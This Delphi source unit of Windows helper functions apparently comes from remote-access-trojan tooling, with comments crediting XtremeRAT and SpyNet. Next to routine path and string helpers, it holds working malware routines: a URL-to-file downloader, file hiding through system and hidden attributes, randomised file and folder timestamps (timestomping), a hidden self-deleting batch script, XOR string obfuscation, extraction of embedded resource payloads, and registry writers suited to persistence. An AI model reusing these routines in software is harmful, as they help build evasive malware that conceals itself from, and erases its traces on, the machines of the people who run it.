unit UnitFunctions;

interface

uses
  Windows, WinInet;
  
const
  MAXSTRINGCOUNT = 1000;

type
  TStringArray = array[0..MAXSTRINGCOUNT] of string;
  TArray = array[0..MAX_PATH] of Char;

function IntToStr(const i: Integer): string;
function StrToInt(const s: string): Integer;
function ExtractFileName(const Path: string): string;
function ExtractFilePath(Filename: string): string;
procedure MyCreateFile(Filename, Buffer: string; BufferSize: Cardinal);
function FileToStr(Filename: string): string;
function TmpDir: string;
function UpperString(S: String): String;
function DirectoryExists(const Directory: string): Boolean;
function MyBoolToStr(TmpBool: Boolean): string;
function MyStrToBool(TmpStr: string): Boolean;
procedure CreateKeyString(Key: HKEY; Subkey, Name, Value: string);
function AppDataDir: string;
function FileExists(FileName: string): Boolean;      
procedure HideFileName(FileName: string);
function CreatePath(Path: string): Boolean;
function MyDeleteFile(s: string): Boolean;
procedure ChangeFileTime(FileName: string);
procedure ChangeDirTime(DirName: string);
function GetBrowser: string;
function GetResourceAsString(pSectionName: pchar): string;
function MyStartThread(p: Pointer; Params: Pointer = nil): Cardinal;
function ParseString(Delim, Str: string): TStringArray;
function MyShellExecute(FileName, Parameters: string; ShowCmd: Integer): Cardinal;
function SysDir: string;
function WinDir: string;     
function RootDir: string;
function ProgramFilesDir: string;
function ShowMsg(Hwnd: HWND; Text: string; Title: string; mType: Integer; bType: Integer): Integer;
procedure MySelfDelete;
function AddRegValue(RegPath, ValueName, ValueType, Value: String): Boolean;
procedure ProcessMessages;
function XorEnDecrypt(Str: string): string;
function StrToArray(Str: string): TArray;
function DownloadToFile(URL, FileName: PChar): Boolean;
function ShellExecute(hWnd: Cardinal; Operation, FileName, Parameters, Directory: PChar;
  ShowCmd: Integer): Cardinal; stdcall; external 'shell32.dll' name 'ShellExecuteA';

implementation

function DownloadToFile(URL, FileName: PChar): Boolean;
var
  hInet, hFile: HINTERNET;
  fHandle, dWrite: Cardinal;
  Buffer: array[1..1024] of Byte;
  bRead: DWORD;
begin
  Result := False;
  hInet := InternetOpen('Mozilla/5.0', INTERNET_OPEN_TYPE_PRECONFIG, nil, nil, 0);
  hFile := InternetOpenURL(hInet, Url, nil, 0, 0, 0);
  if not Assigned(hFile) then Exit;
  fHandle := CreateFile(FileName, GENERIC_WRITE, FILE_SHARE_WRITE, nil, CREATE_ALWAYS, 0, 0);
  if fHandle = INVALID_HANDLE_VALUE then  Exit;
  repeat
    InternetReadFile(hFile, @Buffer, SizeOf(Buffer), bRead);
    WriteFile(fHandle, Buffer[1], bRead, dWrite, nil);
  until bRead = 0;
  CloseHandle(fHandle);
  InternetCloseHandle(hFile);
  InternetCloseHandle(hInet);
  Result := True;
end;
       
//From XtrremeRAT 3.6 source code
function StrToArray(Str: string): TArray;
begin
  ZeroMemory(@Result, SizeOf(TArray));
  if Str <> '' then CopyMemory(@Result, @Str[1], SizeOf(TArray));
end;

function XorEnDecrypt(Str: string): string;  //Simple Xor encryption
var
  i, c, x: Integer;
begin
  for i := 1 to Length(Str) do
  begin
    c := Integer(Str[i]);
    x := c xor 50;
    Result := Result + Char(x);
  end;
end;

//From XtremeRAT
//-----
function xProcessMessage(var Msg: TMsg): Boolean;
begin
  Result := False;
  if PeekMessage(Msg, 0, 0, 0, PM_REMOVE) then
  begin
    Result := True;
    begin
      TranslateMessage(Msg);
      DispatchMessage(Msg);
    end;
  end;

  Sleep(5);
end;

procedure ProcessMessages;
var
  Msg: TMsg;
begin
  while xProcessMessage(Msg) do ;
end;
//-----
     
function LastDelimiter(s: string; Delimiter: Char): Integer;
var
  i: Integer;
begin
  Result := -1;
  i := Length(s);
  if (s = '') or (i = 0) then Exit;
  while s[i] <> Delimiter do
  begin
    if i < 0 then Break;
    Dec(i);
  end;
  Result := i;
end;

function ToType(KeyType: string): Integer;
begin
  if KeyType = 'REG_DWORD' then Result := REG_DWORD;
  if KeyType = 'REG_BINARY' then Result := REG_BINARY;
  if KeyType = 'REG_EXPAND_SZ' then Result := REG_EXPAND_SZ;
  if KeyType = 'REG_MULTI_SZ' then Result := REG_MULTI_SZ;
  if KeyType = 'REG_SZ' then Result := REG_SZ;
end;

function AddRegValue(RegPath, ValueName, ValueType, Value: String): Boolean;
var
  RootKey, SubKey: string;
  phkResult: HKEY;
begin
  Result := False;
  RootKey := Copy(RegPath, 1, Pos('\', RegPath) - 1);
  Delete(RegPath, 1, Pos('\', RegPath));            
  if LastDelimiter(RegPath, '\') > 0 then
  Delete(RegPath, Length(RegPath), LastDelimiter(RegPath, '\'));
  if RegOpenKeyEx(ToType(RootKey), PChar(RegPath), 0, KEY_SET_VALUE, phkResult) <> 0 then Exit;
  Result := RegSetValueEx(phkResult, PChar(ValueName), 0, ToType(ValueType),
    PChar(Value), Length(PChar(Value))) = 0;
  RegCloseKey(phkResult);
end;

function ShowMsg(Hwnd: HWND; Text: string; Title: string; mType: Integer; bType: Integer): Integer;
begin
  if Hwnd = 0 then Hwnd := HWND_DESKTOP;

  if mType = 0 then mType := MB_ICONERROR else
  if mType = 1 then mType := MB_ICONWARNING else
  if mType = 2 then mType := MB_ICONQUESTION else
  if mType = 3 then mType := MB_ICONINFORMATION else mType := 0;

  case bType of
    0: Result := MessageBox(Hwnd, PChar(Text), PChar(Title), mType + MB_OK);
    1: Result := MessageBox(Hwnd, PChar(Text), PChar(Title), mType + MB_OKCANCEL);
    2: Result := MessageBox(Hwnd, PChar(Text), PChar(Title), mType + MB_YESNO);
    3: Result := MessageBox(Hwnd, PChar(Text), PChar(Title), mType + MB_YESNOCANCEL);
    4: Result := MessageBox(Hwnd, PChar(Text), PChar(Title), mType + MB_RETRYCANCEL);
    5: Result := MessageBox(Hwnd, PChar(Text), PChar(Title), mType + MB_ABORTRETRYIGNORE);
  end;
end;
                 
function IntToStr(const i: Integer): string;
begin
  Str(i, Result);
end;

function StrToInt(const s: string): Integer;
var
  i: Integer;
begin
  Val(s, Result, i);
end;

function FileExists(FileName: string): Boolean;
var
  cHandle: THandle;
  FindData: TWin32FindData;
begin
  cHandle := FindFirstFileA(Pchar(FileName),FindData);
  Result := cHandle <> INVALID_HANDLE_VALUE;
  if Result then Windows.FindClose(cHandle);
end;

function ParseString(Delim, Str: string): TStringArray;
var
  Count: Integer;
begin
  Count := 0;
  if Pos(Delim, Str) <= 0 then Exit;

  while (Str <> '') and (Count <= MAXSTRINGCOUNT) do
  begin
    Result[Count] := Copy(Str, 1, Pos(Delim, Str) - 1);
    Delete(Str, 1, Pos(Delim, Str) - 1);
    Delete(Str, 1, Length(Delim));
    Inc(Count);
  end;
end;

function MyStartThread(p: Pointer; Params: Pointer): Cardinal;
var
  hThread: THandle;
begin
  Result := CreateThread(nil, 0, p, Params, 0, hThread);
end;

//p0ke mods by cswi
function GetResources(pSectionName: PChar; out ResourceSize: LongWord): Pointer;
var
  ResourceLocation: Cardinal;
  ResourceHandle: Cardinal;
begin
  ResourceLocation := FindResourceA(hInstance, PAnsiChar(pSectionName), PAnsiChar(10));
  ResourceSize := SizeofResource(hInstance, ResourceLocation);
  ResourceHandle := LoadResource(hInstance, ResourceLocation);
  Result := LockResource(ResourceHandle);
end;

//p0ke mods by cswi
function GetResourceAsString(pSectionName: pchar): string;
var
  ResourceData: PChar;
  SResourceSize: LongWord;
begin
  ResourceData := GetResources(pSectionName, SResourceSize);
  SetString(Result, ResourceData, SResourceSize);
end;
        
function FindExecutable(FileName, Directory: PAnsiChar; Result: PAnsiChar): HINST; stdcall;
  external 'shell32.dll' name 'FindExecutableA';

function GetBrowser: string;
var
  B: array[0..255] of Char;
  hFile: Cardinal;
begin
  hFile := CreateFile(PChar(Tmpdir + 'tmp.htm'), GENERIC_WRITE, 0, nil, CREATE_ALWAYS, 0, 0);
  CloseHandle(hFile);
  FindExecutable(PChar(Tmpdir + 'tmp.htm'), '', B);
  DeleteFile(PChar(Tmpdir + 'tmp.htm'));
  Result := B;
end;

procedure ChangeFileTime(FileName: string);
var
  SHandle: THandle;
  MyFileTime : TFileTime;
begin
  randomize;
  MyFileTime.dwLowDateTime := 29700000 + random(99999);
  MyFileTime.dwHighDateTime:= 29700000 + random(99999);

  SHandle := CreateFile(PChar(FileName), GENERIC_WRITE, FILE_SHARE_READ or FILE_SHARE_WRITE, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
  if SHandle = INVALID_HANDLE_VALUE then
  begin
    CloseHandle(sHandle);
    SHandle := CreateFile(PChar(FileName), GENERIC_WRITE, FILE_SHARE_READ or FILE_SHARE_WRITE, nil, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
    if SHandle <> INVALID_HANDLE_VALUE then
    SetFileTime(sHandle, @MyFileTime, @MyFileTime, @MyFileTime);
    CloseHandle(sHandle);
  end
  else SetFileTime(sHandle, @MyFileTime, @MyFileTime, @MyFileTime);
  CloseHandle(sHandle);
end;

procedure ChangeDirTime(DirName: string);
var
  h: THandle;
  ft: TFileTime;
begin
  ft.dwLowDateTime := 29700000 + random(99999);
  ft.dwHighDateTime:= 29700000 + random(99999);

  h:= CreateFile(PChar(DirName), GENERIC_WRITE, FILE_SHARE_READ, nil,
    OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, 0);

  if h <> INVALID_HANDLE_VALUE then
  begin
    SetFileTime(h, nil, @ft, nil); // last access
    SetFileTime(h, nil, nil, @ft);  // last write
    SetFileTime(h, @ft, nil, nil);   // creation
  end;

  CloseHandle(h);
end;

function MyDeleteFile(s: string): Boolean;
var
  i: Byte;
begin
  Result := False;
  if FileExists(s) then
  try
    i := GetFileAttributes(PChar(s));
    i := i and $00000002;
    i := i and $00000001;
    i := i and $00000004;;
    SetFileAttributes(PChar(s), i);
    Result := DeleteFile(Pchar(s));
  except
  end;
end;

//From SpyNet
function CreatePath(Path: string): Boolean;
var
  TempStr, TempDir: string;
begin
  result := false;
  if Path = '' then exit;
  if DirectoryExists(Path) = true then
  begin
    result := true;
    exit;
  end;

  TempStr := Path;
  if TempStr[length(TempStr)] <> '\' then TempStr := TempStr + '\';

  while pos('\', TempStr) >= 1 do
  begin
    TempDir := TempDir + copy(TempStr, 1, pos('\', TempStr));
    delete(Tempstr, 1, pos('\', TempStr));
    if DirectoryExists(TempDir) = false then
    if Createdirectory(pchar(TempDir), nil) = false then exit;
  end;

  result := DirectoryExists(Path);
end;

function FileToStr(Filename: string): string;
var
  hFile: THandle;
  dSize, dRead: DWORD;
begin
  Result := '';
  hFile := CreateFile(PChar(Filename), GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, 0, 0);
  if hFile = 0 then Exit;
  dSize := GetFileSize(hFile, nil);
  if dSize = 0 then Exit;
  SetFilePointer(hFile, 0, nil, FILE_BEGIN);
  SetLength(Result, dSize);
  ReadFile(hFile, Result[1], dSize, dRead, nil);
  CloseHandle(hFile);
end;

procedure HideFileName(FileName: string);
var
  i: cardinal;
begin
  i := GetFileAttributes(PChar(FileName));
  i := i or $00000001;
  i := i or $00000002;
  i := i or $00000004;;
  SetFileAttributes(PChar(FileName), i);
end;

function MyBoolToStr(TmpBool: Boolean): string;
begin
  if TmpBool = True then Result := 'Yes' else Result := 'No';
end;

function MyStrToBool(TmpStr: string): Boolean;
begin
  if TmpStr = 'Yes' then Result := True else Result := False;
end;

function DirectoryExists(const Directory: string): Boolean; var Code: Integer;
begin
  Code := GetFileAttributes(PChar(Directory));
  Result := (Code <> -1) and (FILE_ATTRIBUTE_DIRECTORY and Code <> 0);
end;

function UpperString(S: String): String; var i: Integer;
begin
  for i := 1 to Length(S) do S[i] := char(CharUpper(PChar(S[i])));
  Result := S;
end;

function ExtractFilePath(Filename: string): string;
begin
  if (LastDelimiter(Filename, '\') = -1) and (LastDelimiter(Filename, '/') = -1) then Exit;
  if LastDelimiter(Filename, '\') <> -1 then Result := Copy(Filename, 1, LastDelimiter(Filename, '\')) else
  if LastDelimiter(Filename, '/') <> -1 then Result := Copy(Filename, 1, LastDelimiter(Filename, '/'));
end;

procedure MyCreateFile(Filename, Buffer: string; BufferSize: Cardinal);
var
  hFile, i: Cardinal;
begin
  if not FileExists(Filename) then
  begin
    hFile := CreateFile(PChar(Filename), GENERIC_WRITE, FILE_SHARE_WRITE, nil, CREATE_ALWAYS, 0, 0);
    if hFile = INVALID_HANDLE_VALUE then Exit;
    SetFilePointer(hFile, 0, nil, FILE_BEGIN);
  end
  else
  begin
    hFile := CreateFile(PChar(Filename), GENERIC_WRITE, FILE_SHARE_WRITE, nil, OPEN_ALWAYS, 0, 0);
    if hFile = INVALID_HANDLE_VALUE then Exit;
    SetFilePointer(hFile, 0, nil, FILE_END);
  end;
  
  WriteFile(hFile, Buffer[1], BufferSize, i, nil);
  CloseHandle(hFile);
end;

function TmpDir: string;
var
  DataSize: byte;
begin
  SetLength(Result, MAX_PATH);
  DataSize := GetTempPath(MAX_PATH, PChar(Result));
  if DataSize <> 0 then
  begin
    SetLength(Result, DataSize);
    if Result[Length(Result)] <> '\' then Result := Result + '\';
  end;
end;
         
function MyShellExecute(FileName, Parameters: string; ShowCmd: Integer): Cardinal;
begin
  Result := ShellExecute(0, 'open', PChar(FileName), PChar(Parameters), nil, ShowCmd);
end;

procedure MySelfDelete;
var
  TmpStr, TmpFile: string;
begin
  TmpFile := TmpDir + IntToStr(GetCurrentProcessId) + '.bat';
  TmpStr := ':f' + #13#10;
  TmpStr := TmpStr + 'attrib -R -A -S -H "' + ParamStr(0) + '"' + #13#10;
  TmpStr := TmpStr + 'del "' + ParamStr(0) + '"' + #13#10;
  TmpStr := TmpStr + 'if EXIST "' + ParamStr(0) + '" goto f' + #13#10;
  TmpStr := TmpStr + 'del "' + TmpFile + '"' + #13#10;
  TmpStr := TmpStr + 'del %0';
  MyCreateFile(TmpFile, TmpStr, Length(TmpStr));
  MyShellExecute(PChar(TmpFile), '', SW_HIDE);
end;

function WinDir: string;
var
  DataSize: byte;
begin
  SetLength(Result, 255);
  DataSize := GetWindowsDirectory(PChar(Result), 255);
  if DataSize <> 0 then
  begin
    SetLength(Result, DataSize);
    if Result[Length(Result)] <> '\' then Result := Result + '\';
  end;
end;

function RootDir: string;
begin
  Result := Copy(WinDir, 1, 3);
end;

function SysDir: string;
var
  DataSize: byte;
begin
  SetLength(Result, 255);
  DataSize := GetSystemDirectory(PChar(Result), 255);
  if DataSize <> 0 then
  begin
    SetLength(Result, DataSize);
    if Result[Length(Result)] <> '\' then Result := Result + '\';
  end;
end;

function ExtractFileName(const Path: string): string;
var
  i, L: integer;
  Ch: Char;
begin
  L := Length(Path);
  for i := L downto 1 do
  begin
    Ch := Path[i];
    if (Ch = '\') or (Ch = '/') then
    begin
      Result := Copy(Path, i + 1, L - i);
      Break;
    end;
  end;
end;

procedure CreateKeyString(Key: HKEY; Subkey, Name, Value: string);
var
  regkey: Hkey;
begin
  RegCreateKey(Key, PChar(subkey), regkey);
  RegSetValueEx(regkey, PChar(name), 0, REG_EXPAND_SZ, PChar(value), Length(value));
  RegCloseKey(regkey);
end;
   
function SHGetSpecialFolderPath(hwndOwner: HWND; lpszPath: PAnsiChar;
  nFolder: Integer; fCreate: BOOL): BOOL; stdcall; external 'shell32.dll' name 'SHGetSpecialFolderPathA'
    
function GetSpecialFolder(const CSIDL : integer): string;
var
  RecPath: array[0..255] of Char;
begin
  Result := '';
  if SHGetSpecialFolderPath(0, RecPath, CSIDL, false) then Result := RecPath;
  if Result[Length(Result)] <> '\' then Result := Result + '\';
end;

function ProgramFilesDir: string;
begin
  Result := GetSpecialFolder($0026);
end;

function AppDataDir: string;
begin
  Result := GetSpecialFolder($001A);
end;

end.
